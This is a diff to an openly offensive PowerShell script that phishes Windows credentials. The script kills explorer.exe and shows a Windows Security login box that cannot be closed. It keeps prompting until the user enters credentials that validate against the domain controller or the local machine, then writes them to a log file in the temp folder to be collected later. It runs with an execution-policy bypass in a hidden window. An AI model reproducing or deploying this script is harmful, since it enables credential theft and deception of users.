@@ -1,16 +1,15 @@
-
 <#
 .SYNOPSIS
   Standalone Powershell script that will promp the current user for a valid credential.
 
 .Author: r00t-3xp10it - (Based on @Dviros CredsLeaker poc)
-  Required Dependencies: target Account Password
+  Required Dependencies: target Account Password set
   Optional Dependencies: None
 
 .DESCRIPTION
    This script will display a Windows Security Credentials box that will ask the user for his credentials.
    The box cannot be closed (only by killing the process) and it keeps checking the credentials against the DC.
-   If its valid, it will leak it via one remote logfile stored on target %TMP% folder to be retrieved later.
+   If its valid, it will leak it via one remote logfile stored on target $env:tmp folder to be retrieved later.
 
 .EXECUTION
    powershell.exe -exec bypass -w 1 -noninteractive -nologo -file "NewPhish.ps1"
@@ -22,6 +21,7 @@
 #>
 
 
+$timestamp = $null
 taskkill /f /im explorer.exe
 $ComputerName = $env:COMPUTERNAME
 $CurrentDomain_Name = $env:USERDOMAIN
@@ -76,9 +76,8 @@ function Credentials(){
                 $domain = "WORKGROUP"
                 $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
                 if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
-                    # Leak Creds to remote logfile ($env:tmp)
-                    $timestamp = Get-Date;
-                    echo "" > $env:tmp\CredsPhish.log
+                    ## Leak Creds to remote logfile ($env:tmp)
+                    $timestamp = Get-Date;echo "" > $env:tmp\CredsPhish.log
                     echo "   Captured Credentials (logon)" >> $env:tmp\CredsPhish.log
                     echo "   ----------------------------" >> $env:tmp\CredsPhish.log
                     echo "   TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
@@ -92,15 +91,6 @@ function Credentials(){
                     Credentials
                     }                
                 }
-            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
-            $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)
-            if ($domain.name -eq $null){
-                Credentials
-            }
-            else {
-                $status = $false
-                exit
-            }
         }
     }
 }
